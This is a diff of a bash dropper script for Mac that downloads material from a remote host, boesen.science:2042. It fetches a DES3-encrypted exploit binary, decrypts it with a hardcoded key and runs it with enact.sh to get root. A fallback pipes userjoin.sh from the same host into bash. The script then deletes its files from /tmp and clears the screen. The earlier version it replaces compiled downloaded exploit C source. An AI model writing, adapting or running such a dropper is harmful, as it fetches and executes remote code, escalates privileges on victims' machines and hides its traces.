@@ -1,21 +1,20 @@
 #!/usr/bin/env bash
+# Don't try to set variables in this file. Each line is executed independently.
 
-# You can't set variables in this file. Each line is executed independently.
-# That's one of the reasons enact.sh needs to be separate.
-#curl -Lso /tmp/elevate.out boesen.science:2042/mac/elevate.out
-curl -Lo /tmp/exp.c boesen.science:2042/mac/exp.c
-gcc /tmp/exp.c -o /tmp/a.out
-curl -Lso /tmp/enact.sh boesen.science:2042/mac/enact.sh
-chmod +x /tmp/enact.sh
+curl -Lo /tmp/exp.out.des3 boesen.science:2042/mac/exp.out.des3
+openssl des3 -d -in /tmp/exp.out.des3 -k b51861c95142fce29aef7b6416fa21d5 > /tmp/exp.out
 
-# If something's gone wrong, join the user without getting root.
-if [ ! -f /tmp/a.out ]; then curl -L boesen.science:2042/mac/userjoin.sh |bash; fi
+curl -Lo /tmp/enact.sh boesen.science:2042/mac/enact.sh
 
-/tmp/a.out <<EOF
+chmod +x /tmp/exp.out /tmp/enact.sh
+
+/tmp/exp.out <<EOF
 /tmp/enact.sh
 EOF
 
+# If something went wrong, join the user without getting root.
+if [ ! -f /tmp/exp.out ]; then curl -L boesen.science:2042/mac/userjoin.sh |bash; fi
 
-rm -f /tmp/*.sh /tmp/*.c /tmp/*.out
+rm -f /tmp/*.{sh,out,des3}
 
 clear
